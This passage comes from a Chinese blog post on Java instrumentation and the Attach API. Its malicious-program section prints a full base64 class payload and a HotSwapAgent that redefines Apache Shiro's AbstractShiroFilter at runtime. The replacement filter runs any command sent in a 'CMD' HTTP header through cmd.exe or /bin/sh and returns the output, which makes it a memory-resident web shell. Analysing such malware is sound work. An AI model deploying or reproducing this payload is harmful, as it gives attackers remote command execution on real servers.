0dHBTZXJ2bGV0UmVzcG9uc2UMAHABNgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDACQAJEHATcBAC9vcmcvYXBhY2hlL3NoaXJvL3dlYi9zdWJqZWN0L1dlYlN1YmplY3QkQnVpbGRlcgEAB0J1aWxkZXIMAHABOAwBOQE6DAE7ATwHASAMAT0BPgcBIQwBPwBxAQATamF2YS9sYW5nL1Rocm93YWJsZQEAinNlc3Npb24udG91Y2goKSBtZXRob2QgaW52b2NhdGlvbiBoYXMgZmFpbGVkLiAgVW5hYmxlIHRvIHVwZGF0ZXRoZSBjb3JyZXNwb25kaW5nIHNlc3Npb24ncyBsYXN0IGFjY2VzcyB0aW1lIGJhc2VkIG9uIHRoZSBpbmNvbWluZyByZXF1ZXN0LgwBQAFBBwFCDAFDAUQHAUUMAUYAfwEAA0NNRAwBRwEqAQAHb3MubmFtZQwBSAEqDAFJAUoBAAd3aW5kb3dzDAFLAUwBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEABy9iaW4vc2gBAAIvYwEAAi1jAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABwAU0MAU4BTwwBUAFRBwFSDAFTAVQBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBJAwBVQFWDAFXAVgMAVkAcQEAE2phdmEvaW8vUHJpbnRXcml0ZXIMAVoBWwwAcAFcDAFdAV4MAHABXwwBVwExDAFgAHEMAI0AjgwAkgCTDACVAJYBADJvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIkMQwAcAFhDAFiAWMBACtvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvRXhlY3V0aW9uRXhjZXB0aW9uDAFkAWUBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAYRmlsdGVyZWQgcmVxdWVzdCBmYWlsZWQuDABwAUEMAHgAeQEAQ05vIEZpbHRlckNoYWluUmVzb2x2ZXIgY29uZmlndXJlZC4gIFJldHVybmluZyBvcmlnaW5hbCBGaWx0ZXJDaGFpbi4MAWYBMQcBJgwBZwCpAQA6UmVzb2x2ZWQgYSBjb25maWd1cmVkIEZpbHRlckNoYWluIGZvciB0aGUgY3VycmVudCByZXF1ZXN0LgwBaAExAQBGTm8gRmlsdGVyQ2hhaW4gY29uZmlndXJlZCBmb3IgdGhlIGN1cnJlbnQgcmVxdWVzdC4gIFVzaW5nIHRoZSBkZWZhdWx0LgwAqACpBwEiDAFpAJgBADBvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIHAWoMAWsBbAEAMW9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvT25jZVBlclJlcXVlc3RGaWx0ZXIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQArb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAIG9yZy9hcGFjaGUvc2hpcm8vc3ViamVjdC9TdWJqZWN0AQAgb3JnL2FwYWNoZS9zaGlyby9zZXNzaW9uL1Nlc3Npb24BABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAJbQgEAM29yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcgEAHm9yZy9hcGFjaGUvc2hpcm8vU2VjdXJpdHlVdGlscwEAKShMb3JnL2FwYWNoZS9zaGlyby9tZ3QvU2VjdXJpdHlNYW5hZ2VyOylWAQAMZ2V0SW5pdFBhcmFtAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQm9vbGVhbjsBAAxib29sZWFuVmFsdWUBABBvcmcvc2xmNGovTG9nZ2VyAQAEaW5mbwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWlzSHR0cFNlc3Npb25Nb2RlAQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEASShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDtaKVYBAH8oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0O0xvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0OylWAQAnb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0AQBmKExvcmcvYXBhY2hlL3NoaXJvL21ndC9TZWN1cml0eU1hbmFnZXI7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPYnVpbGRXZWJTdWJqZWN0AQArKClMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEACmdldFN1YmplY3QBACQoKUxvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvU3ViamVjdDsBAApnZXRTZXNzaW9uAQAlKFopTG9yZy9hcGFjaGUvc2hpcm8vc2Vzc2lvbi9TZXNzaW9uOwEABXRvdWNoAQAFZXJyb3IBACooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAlnZXRIZWFkZXIBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFZmx1c2gBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABShbQilWAQAFY2xvc2UBAI0oTG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvQWJzdHJhY3RTaGlyb0ZpbHRlcjtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdleGVjdXRlAQAzKExqYXZhL3V0aWwvY29uY3VycmVudC9DYWxsYWJsZTspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2F1c2UBABcoKUxqYXZhL2xhbmcvVGhyb3dhYmxlOwEABWRlYnVnAQAIZ2V0Q2hhaW4BAAV0cmFjZQEACGRvRmlsdGVyAQAXb3JnL3NsZjRqL0xvZ2dlckZhY3RvcnkBAAlnZXRMb2dnZXIBACUoTGphdmEvbGFuZy9DbGFzczspTG9yZy9zbGY0ai9Mb2dnZXI7BCEAYABiAAAABQAaAGUAZgAAABoAZwBoAAEAaQAAAAIACwACAGoAawAAAAIAbABtAAAAAgBuAG8AAAAXAAQAcABxAAEAcgAAACoAAgABAAAACiq3AAEqA7UAArEAAAABAHMAAAAOAAMAAABdAAQAXgAJAF8AAQB0AHUAAQByAAAAHQABAAEAAAAFKrQAA7AAAAABAHMAAAAGAAEAAABiAAEAdgB3AAEAcgAAACIAAgACAAAABiortQADsQAAAAEAcwAAAAoAAgAAAGYABQBnAAEAeAB5AAEAcgAAAB0AAQABAAAABSq0AASwAAAAAQBzAAAABgABAAAAagABAHoAewABAHIAAAAiAAIAAgAAAAYqK7UABLEAAAABAHMAAAAKAAIAAABuAAUAbwABAHw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&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">ClassDefinition</span> <span class="n">classDefinition</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassDefinition</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">arrayOfByte</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">paramInstrumentation</span><span class="o">.</span><span class="na">redefineClasses</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassDefinition</span><span class="o">[]</span> <span class="o">{</span> <span class="n">classDefinition</span> <span class="o">});</span>
+</span></span><span class="line"><span class="cl">          <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">          <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>agent.jar/META-INF/MANIFEST.MF：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-MF" data-lang="MF"><span class="line"><span class="cl"><span class="nf">Manifest-Version</span><span class="o">:</span> 1.0
+</span></span><span class="line"><span class="cl"><span class="nf">Can-Redefine-Classes</span><span class="o">:</span> <span class="n">true</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Agent-Class</span><span class="o">:</span> <span class="n">HotSwapAgent</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Premain-Class</span><span class="o">:</span> <span class="n">HotSwapAgent</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Can-Retransform-Classes</span><span class="o">:</span> <span class="n">true</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>作者用自定义类替换 “org.apache.shiro.web.servlet.AbstractShiroFilter”，企图绕过鉴权。</p>
+<h2 id="写在后面">写在后面</h2>
+<p>微服务架构下，进程间的联系错综复杂，客户端的请求到了服务器端后可能形成了复杂的调用链，假如发生了异常，如何查明哪里发生故障以及什么原因导致性能下降？<strong>分布式追踪（Distributed Tracing）</strong> 正是一种解决方案。Java 王国有着许许多多的 APM（Application Performance Monitoring）系统专门解决此类问题，例如 <a class="link" href="https://github.com/apache/skywalking"  target="_blank" rel="noopener"
+    >SkyWalking</a>、<a class="link" href="https://github.com/openzipkin/zipkin"  target="_blank" rel="noopener"
+    >Zipkin</a>、<a class="link" href="https://github.com/naver/pinpoint"  target="_blank" rel="noopener"
+    >Pinpoint</a>，它们或多或少支持了名为 <a class="link" href="https://opentracing.io/"  target="_blank" rel="noopener"
+    >OpenTracing</a> 的标准，分布式追踪的标准与技术非常有助于微服务架构下的故障排除。</p>
+<blockquote>
+<p>本文首发于 <a class="link" href="https://h2cone.github.io"  target="_blank" rel="noopener"
+    >https://h2cone.github.io</a></p>
+</blockquote>
+<h2 id="文章参考">文章参考</h2>
+<ul>
+<li>
+<p><a class="link" href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html"  target="_blank" rel="noopener"
+    >Package java.lang.instrument</a></p>
+</li>
+<li>
+<p><a class="link" href="https://en.wikipedia.org/wiki/Instrumentation_%28computer_programming%29"  target="_blank" rel="noopener"
+    >Instrumentation (computer programming)</a></p>
+</li>
+<li>
+<p><a class="link" href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/Instrumentation.html"  target="_blank" rel="noopener"
+    >Interface Instrumentation</a></p>
+</li>
+<li>
+<p><a class="link" href="https://docs.oracle.com/javase/8/docs/jdk/api/attach/spec/com/sun/tools/attach/package-summary.html"  target="_blank" rel="noopener"
+    >Attach API</a></p>
+</li>
+<li>
+<p><a class="link" href="https://mp.weixin.qq.com/s/cwU2rLOuwock048rKBz3ew"  target="_blank" rel="noopener"
+    >入门科普，围绕JVM的各种外挂技术</a></p>
+</li>
+<li>
+<p><a class="link" href="https://javapapers.com/core-java/java-instrumentation/"  target="_blank" rel="noopener"
+    >java-instrumentation</a></p>
+</li>
+<li>
+<p><a class="link" href="https://www.baeldung.com/java-instrumentation"  target="_blank" rel="noopener"
+    >Guide to Java Instrumentation</a></p>
+</li>
+<li>
+<p><a class="link" href="https://www.cnblogs.com/LittleHann/p/4783581.html"  target="_blank" rel="noopener"
+    >Java Attach API</a></p>
+</li>
+<li>
+<p><a class="link" href="https://www.cnkirito.moe/instrument/"  target="_blank" rel="noopener"
+    >JAVA 拾遗 &ndash;Instrument 机制</a></p>
+</li>
+<li>
+<p><a class="link" href="https://www.javamex.com/tutorials/memory/instrumentation.shtml"  target="_blank" rel="noopener"
+    >Instrumentation: querying the memory usage of a Java object</a></p>
+</li>
+<li>
+<p><a class="link" href="https://tech.meituan.com/2019/02/28/java-dynamic-trace.html"  target="_blank" rel="noopener"
+    >Java动态追踪技术探究</a></p>
+</li>
+<li>
+<p><a class="link" href="https://www.infoq.cn/article/javaagent-illustrated"  target="_blank" rel="noopener"
+    >JVM 源码分析之 javaagent 原理完全解读</a></p>
+</li>
+<li>
+<p><a class="link" href="https://mp.weixin.qq.com/s/4bZ6iSvpqPsjdvkSoFVhrg"  target="_blank" rel="noopener"
+    >Java神器BTrace，从入门到熟练小工的手册</a></p>
+</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java/">java</a>
+        
+            <a href="/tags/trace/">trace</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Huangh&#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#序言">序言</a></li>
+    <li><a href="#instrument">Instrument</a>
+      <ol>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#体验">体验</a></li>
+      </ol>
+    </li>
+    <li><a href="#attach">Attach</a>
+      <ol>
+        <li><a href="#简述">简述</a></li>
+        <li><a href="#例子">例子</a></li>
+      </ol>
+    </li>
+    <li><a href="#恶意程序">恶意程序</a></li>
+    <li><a href="#写在后面">写在后面</a></li>
+    <li><a href="#文章参考">文章参考</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
